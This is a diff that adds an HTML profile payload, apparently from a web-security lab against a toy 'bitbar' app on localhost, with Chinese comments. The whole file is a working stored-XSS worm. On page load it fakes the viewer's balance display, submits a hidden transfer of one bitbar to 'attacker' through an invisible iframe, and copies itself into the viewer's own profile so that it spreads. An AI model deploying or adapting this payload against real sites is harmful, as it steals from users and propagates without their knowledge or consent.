@@ -1,0 +1,40 @@
+<div id='attack'>
+    the world is my oyster.
+    <script>
+        // 将bitbars展示改为10
+        var a = document.getElementById("bitbar_display");
+        a.id = "chenhao";
+        a.innerHTML = "10 bitbars";
+
+        // 给attacker转1 bitbars
+        function vivo_1_bitbar() {
+            var a = document.getElementById("vivo_1_bitbar");
+            a.submit();
+        }
+
+        // 将这份profile复制到自己的profiles
+        window.onload = function () {
+            var a = document.getElementById("attack");
+            profile = "<div id='attack'>".concat(a.innerHTML).concat("</div>");
+            a = document.getElementById("worm_profile");
+            a.value = profile;
+            a = document.getElementById("worm");
+            a.submit();
+        }
+    </script>
+
+
+    <form id="vivo_1_bitbar" method="POST" target="vivo_frame" action="http://localhost:3000/post_transfer">
+        <input name="destination_username" type="hidden" value="attacker">
+        <input name="quantity" type="hidden" value="1">
+    </form>
+    <iframe style="width:0; height:0; border:0; border:none" name="vivo_frame"></iframe>
+    <script>
+        vivo_1_bitbar();
+    </script>
+
+    <form id="worm" method="POST" target="worm_frame" action="http://localhost:3000/set_profile">
+        <textarea id="worm_profile" name="new_profile" style="display:none;"></textarea>
+    </form>
+    <iframe style="width:0; height:0; border:0; border:none" name="worm_frame"></iframe>
+</div>
